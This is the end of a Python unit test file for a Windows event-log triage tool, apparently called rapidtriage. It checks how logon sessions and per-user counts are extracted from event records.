        reused = next(item for item in sessions if item["user_name"] == "홍길동" and item["session_occurrence"] == 1)
        self.assertEqual(reused["session_status"], "open-or-not-observed")
        self.assertEqual(reused["logon_type"], "2")
        other = next(item for item in sessions if item["user_name"] == "other")
        self.assertEqual(other["session_key"], "WIN-QA|other|0x1a2b")
        summary = next(row.details for row in rows if row.artifact_type == "eventlog-summary")
        users = {item["value"]: item["count"] for item in summary["user_counts"]}
        self.assertEqual(users.get("홍길동"), 4)
        self.assertNotIn("0x8020000000000000", users)


def _row(details: dict):
    from rapidtriage.core.models import ArtifactRecord

    return ArtifactRecord(provider="windows-eventlog", artifact_type="eventlog-event", path="x", supported=True, details=details)


if __name__ == "__main__":
    unittest.main()
